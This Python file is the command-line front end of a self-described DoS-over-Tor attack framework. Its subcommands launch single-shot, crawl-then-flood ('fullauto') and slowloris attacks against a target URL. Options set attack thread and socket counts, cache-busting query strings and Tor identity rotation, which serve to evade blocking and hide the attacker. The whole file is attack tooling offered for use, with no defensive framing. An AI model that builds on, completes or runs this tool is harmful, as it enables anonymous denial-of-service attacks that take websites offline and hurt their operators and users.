#!/usr/bin/env python
"""
CLI entry point for the DoS-over-Tor attack framework. Provides Click-based subcommands: `singleshot`, `fullauto`, `slowloris`, and `interactive`.
"""

from typing import Any, Callable, Optional
import click
from app.runner import AttackRunner
from app.models import AttackConfig
from app.wizard import InteractiveWizard


@click.group()
def cli() -> None:
    """DoS-over-Tor Attack Framework"""
    pass


def common_options(func: Callable[..., Any]) -> Callable[..., Any]:
    """Decorator to add common options to all subcommands"""
    func = click.option(
        '--tor-address',
        default='127.0.0.1',
        help='Tor service address'
    )(func)
    func = click.option(
        '--tor-proxy-port',
        default=9050,
        type=click.IntRange(1, 65535),
        help='Tor SOCKS proxy port'
    )(func)
    func = click.option(
        '--tor-ctrl-port',
        default=9051,
        type=click.IntRange(1, 65535),
        help='Tor control port'
    )(func)
    func = click.option(
        '--num-threads',
        default=10,
        type=click.IntRange(1, 100),
        help='Number of soldier threads'
    )(func)
    func = click.option(
        '--http-method',
        default='GET',
        type=click.Choice(['GET', 'POST', 'PUT', 'DELETE']),
        help='HTTP method for requests'
    )(func)
    func = click.option(
        '--cache-buster',
        default=False,
        is_flag=True,
        help='Add cache-busting query strings'
    )(func)
    func = click.option(
        '--identity-rotation-interval',
        default=None,
        type=click.IntRange(1),
        help='Tor identity rotation interval in seconds'
    )(func)
    return func


@cli.command()
@click.argument('target')
@common_options
def singleshot(
    target: str,
    tor_address: str,
    tor_proxy_port: int,
    tor_ctrl_port: int,
    num_threads: int,
    http_method: str,
    cache_buster: bool,
    identity_rotation_interval: Optional[int]
) -> None:
    """Run single-shot attack on a URL"""
    config = AttackConfig(
        mode='singleshot',
        target=target,
        tor_address=tor_address,
        tor_proxy_port=tor_proxy_port,
        tor_ctrl_port=tor_ctrl_port,
        num_threads=num_threads,
        http_method=http_method,
        cache_buster=cache_buster,
        identity_rotation_interval=identity_rotation_interval
    )
    runner = AttackRunner(config)
    try:
        success = runner.run()
        exit(0 if success else 1)
    except KeyboardInterrupt:
        exit(1)


@cli.command()
@click.argument('target')
@click.option(
    '--max-urls',
    default=500,
    type=click.IntRange(1),
    help='Maximum URLs to discover per thread'
)
@click.option(
    '--max-time',
    default=180,
    type=click.IntRange(1),
    help='Maximum crawl time in seconds per thread'
)
@common_options
def fullauto(
    target: str,
    max_urls: int,
    max_time: int,
    tor_address: str,
    tor_proxy_port: int,
    tor_ctrl_port: int,
    num_threads: int,
    http_method: str,
    cache_buster: bool,
    identity_rotation_interval: Optional[int]
) -> None:
    """Run full-auto attack on a domain with crawling"""
    config = AttackConfig(
        mode='fullauto',
        target=target,
        fullauto_max_urls=max_urls,
        fullauto_max_time=max_time,
        tor_address=tor_address,
        tor_proxy_port=tor_proxy_port,
        tor_ctrl_port=tor_ctrl_port,
        num_threads=num_threads,
        http_method=http_method,
        cache_buster=cache_buster,
        identity_rotation_interval=identity_rotation_interval
    )
    runner = AttackRunner(config)
    try:
        success = runner.run()
        exit(0 if success else 1)
    except KeyboardInterrupt:
        exit(1)


@cli.command()
@click.argument('target')
@click.option(
    '--num-sockets',
    default=100,
    type=click.IntRange(1),
    help='Number of sockets per thread'
)
@common_options
def slowloris(
    target: str,
    num_sockets: int,
    tor_address: str,
    tor_proxy_port: int,
    tor_ctrl_port: int,
    num_threads: int,
    http_method: str,
    cache_buster: bool,
    identity_rotation_interval: Optional[int]
) -> None:
    """Run slowloris attack on a URL"""
    config = AttackConfig(
        mode='slowloris',
        target=target,
        slowloris_num_sockets=num_sockets,
        tor_address=tor_address,
        tor_proxy_port=tor_proxy_port,
        tor_ctrl_port=tor_ctrl_port,
        num_threads=num_threads,
        http_method=http_method,
        cache_buster=cache_buster,
        identity_rotation_interval=identity_rotation_interval
    )
    runner = AttackRunner(config)
    try:
        success = runner.run()
        exit(0 if success else 1)
    except KeyboardInterrupt:
        exit(1)


@cli.command()
def interactive() -> None:
    """Run attack in interactive wizard mode"""
    wizard = InteractiveWizard()
    try:
        success = wizard.run()
        exit(0 if success else 1)
    except KeyboardInterrupt:
        exit(1)


def main() -> None:
    cli()


if __name__ == '__main__':
    main()

